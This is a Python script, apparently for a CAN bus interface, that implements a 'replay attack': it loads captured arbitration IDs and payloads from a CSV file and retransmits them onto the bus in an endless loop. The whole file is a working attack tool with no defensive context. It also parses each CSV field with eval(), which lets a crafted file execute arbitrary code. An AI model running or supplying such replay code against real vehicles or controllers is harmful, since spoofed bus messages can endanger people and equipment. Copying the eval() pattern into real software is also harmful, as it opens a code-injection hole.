from frame import Frame
from mydevice import MyDevice
import csv
import time


class RepayAttack(MyDevice):
    def __init__(self):
        super(RepayAttack, self).__init__()

    def replay(self):
        with open('data.csv', 'r', newline="") as file:
            readers = csv.reader(file)
            for read in readers:
                temp_list = []
                print(read[1])
                new_list = eval(read[1])
                for i in new_list:
                    temp_list.append(int(i, 16))
                send_frame = Frame(arb_id=int(read[0], 16), data=temp_list)
                self.transmit(tx_frame=send_frame)

    def time_gap(self, i):
        print("count down")
        time.sleep(i)


if __name__ == "__main__":
    replay_attack = RepayAttack()
    replay_attack.start(500)
    try:
        while True:
            replay_attack.replay()
    except Exception as result:
        print("unknown error :%s" % result)

    finally:
        replay_attack.stop()